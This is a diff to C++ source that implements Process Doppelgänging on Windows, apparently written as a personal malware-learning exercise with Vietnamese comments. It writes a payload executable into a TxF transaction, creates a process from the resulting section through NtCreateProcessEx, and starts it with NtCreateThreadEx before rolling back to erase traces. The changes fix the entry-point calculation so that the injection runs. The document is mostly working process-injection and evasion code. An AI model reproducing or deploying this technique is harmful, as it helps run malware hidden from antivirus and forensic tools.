@@ -120,7 +120,6 @@ typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
 	PVOID AttributeList        // NULL
 	);
 
-
 int main()
 {
 	//lay cac WINAPI can thiet
@@ -129,7 +128,7 @@ int main()
 	NtCreateProcessEx_t NtCreateProcessEx = (NtCreateProcessEx_t)GetProcAddress(ntdll, "NtCreateProcessEx");
 	NtCreateThreadEx_t NtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");
 	NtQueryInformationProcess_t NtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(ntdll, "NtQueryInformationProcess");
-
+	
 	// Tao giao dich TxF
 	HANDLE hTransaction = CreateTransaction(0, 0, TRANSACTION_DO_NOT_PROMOTE, 0, 0, 0, 0);
 	if (hTransaction == INVALID_HANDLE_VALUE)
@@ -148,7 +147,7 @@ int main()
 	}
 
 	// Ghi noi dung file doc hai vao trong giao dich
-	HANDLE hMal = CreateFile(L"G:\\VNPT Fresher\\Malware learn\\Doppelgang\\Thongbao.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hMal = CreateFile(L"G:\\VNPT Fresher\\Malware learn\\Doppelgang\\PEtoigian.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hMal == INVALID_HANDLE_VALUE)
 	{
 		std::cerr << "Failed to open ie file\n";
@@ -177,7 +176,7 @@ int main()
 	CloseHandle(hFile);
 	CloseHandle(hTransaction);
 
-	// Tao tien trinh tu section // NtCreateProcessEX dang FAIL
+	// Tao tien trinh tu section // NtCreateProcessEX da chay
 	HANDLE hProcess = NULL;
 	status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 0x00000004, // Ke thua Handles
 		hSection, NULL, NULL, FALSE);
@@ -196,18 +195,56 @@ int main()
 	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &pebSize);
 	CloseHandle(hSection);
 	// Lay entrypoint
-	LPVOID baseAddress = pbi.PebBaseAddress;
-	ULONG_PTR head = (ULONG_PTR)buffer;
-	PIMAGE_NT_HEADERS nthead = (PIMAGE_NT_HEADERS)(head + ((PIMAGE_DOS_HEADER)head)->e_lfanew);
-	DWORD entryRVA = nthead->OptionalHeader.AddressOfEntryPoint;
+	//LPVOID baseAddress = pbi.PebBaseAddress;
+	LPVOID baseAddress = peb.lpImageBaseAddress;
+	IMAGE_DOS_HEADER head;
 
+	SIZE_T bytesRead = 0;
+	ReadProcessMemory(hProcess, baseAddress, &head, sizeof(head), &bytesRead);
+	IMAGE_NT_HEADERS nthead;
+	ReadProcessMemory(hProcess, (LPVOID)((ULONG_PTR)baseAddress + head.e_lfanew), &nthead, sizeof(nthead), &bytesRead);
+	
+	DWORD entryRVA = nthead.OptionalHeader.AddressOfEntryPoint;
 
-	// Tao thread thuc thi
-	LPVOID remoteEntry = (LPVOID)((ULONG)baseAddress + entryRVA);
-	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)remoteEntry, 0, 0, 0);
-	if (!hThread)
+	IMAGE_SECTION_HEADER section;
+	ReadProcessMemory(hProcess,
+		(LPBYTE)baseAddress + head.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nthead.FileHeader.SizeOfOptionalHeader,
+		&section, sizeof(section), NULL);
+	std::cout << section.Name;
+	printf("\n");
+	LPVOID textAddr = (LPBYTE)baseAddress + section.VirtualAddress;
+	printf("%p\n", textAddr);
+	byte buff[32];
+	bytesRead = 0;
+	ReadProcessMemory(hProcess, textAddr, &buff, sizeof(buff), &bytesRead);
+	for (int j = 0; j < 32; j++) 
+	{ 
+		printf("%02X", buff[j]);
+	} 
+	printf("\n");
+	// !!Ket qua dump entry point cho thay entry point dang bi sai, co the do lay tu ntheader cua file thay vi tu peb cua process
+	// Tao thread thuc thi  # Sai do cast (ULONG)baseAddress chi lay 32bit thap, phai dung (ULONG_PTR)baseAddress du 64bit
+	LPVOID remoteEntry = (LPVOID)((ULONG_PTR)baseAddress + entryRVA);
+	BYTE check[32];
+	printf("%p\n", remoteEntry);
+	ReadProcessMemory(hProcess, remoteEntry, check, sizeof(check), &bytesRead);
+	for (int j = 0; j < 32; j++)
 	{
-		std::cerr << "NtCreateThreadEx failed\n";
+		printf("%02X", check[j]);;
+	}
+	HANDLE hThread = NULL;
+	status = NtCreateThreadEx(&hThread,
+		THREAD_ALL_ACCESS,
+		NULL,
+		hProcess,
+		remoteEntry,
+		NULL,
+		FALSE,
+		0,0,0,
+		NULL);
+	if (!NT_SUCCESS(status))
+	{
+		std::cerr << "\nNtCreateThreadEx failed\n";
 		return 1;
 	}
 	// Rollback, xoa dau vet
